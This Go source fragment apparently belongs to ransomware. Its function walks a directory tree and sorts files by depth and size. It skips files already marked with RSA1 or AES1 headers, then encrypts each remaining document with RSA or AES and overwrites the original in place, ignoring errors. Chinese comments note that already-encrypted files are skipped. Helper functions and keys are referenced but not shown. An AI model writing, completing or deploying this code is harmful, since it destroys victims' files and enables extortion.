package main

import (
	"bytes"
	"fmt"
	"sort"
	"strconv"
)

type dirElement struct {
	path  string
	size  int64
	depth int64
}

type dirElementSortBySize []dirElement

// Len implements sort.Interface.
func (a dirElementSortBySize) Len() int {
	return len(a)
}

// Swap implements sort.Interface.
func (a dirElementSortBySize) Swap(i int, j int) {
	a[i], a[j] = a[j], a[i]
}

func (a dirElementSortBySize) Less(i, j int) bool {
	if a[i].depth == a[j].depth {
		return a[i].size < a[j].size
	} else {
		return a[i].depth < a[j].depth
	}
}

func encryptSubDirByBFS(dir string) {
	docs := getAllDocs(dir)
	sort.Sort(dirElementSortBySize(docs))
	ASMETRI_MAX_INT, err := strconv.Atoi(byte_decode2str(ASMETRI_MAX[:]))
	if err != nil {

	}

	for i, doc := range docs {
		if IS_DEBUG {
			fmt.Println(i, doc.depth, doc.size, doc.path)
		}
		_, docData := readFile(doc.path)

		//如果文件已经被加密过了就不加密了
		if bytes.Equal(docData[:17], RSA1_HEADER) || bytes.Equal(docData[:17], AES1_HEADER) {
			continue
		}

		var data []byte
		var err error
		if doc.size < int64(ASMETRI_MAX_INT) {
			data, err = rsa_encrypt(docData)
			data = append(RSA1_HEADER, data...)
		} else {
			data, err = aes_encrypt(docData)
			data = append(AES1_HEADER, data...)
		}
		if err != nil {
			if IS_DEBUG {
				fmt.Println("出现错误", err)
			}
		}
		writeFile(doc.path, data)
	}
}
